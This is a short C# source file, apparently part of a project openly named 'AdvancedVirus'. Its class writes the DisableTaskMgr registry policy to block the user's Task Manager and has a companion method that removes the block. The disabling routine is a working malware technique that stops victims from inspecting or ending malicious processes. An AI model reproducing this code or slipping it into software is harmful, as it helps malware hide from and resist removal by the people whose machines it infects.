using System;
using Microsoft.Win32;

namespace AdvancedVirus
{
    public class TaskManagerDisabler
    {
        public void DisableTaskManager()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                }
                Console.WriteLine("Task Manager disabled via registry.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to disable Task Manager: {ex.Message}");
            }
        }

        public void EnableTaskManager()
        {
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true))
                {
                    key?.DeleteValue("DisableTaskMgr", false);
                }
                Console.WriteLine("Task Manager re-enabled.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($" Failed to enable Task Manager: {ex.Message}");
            }
        }
    }
}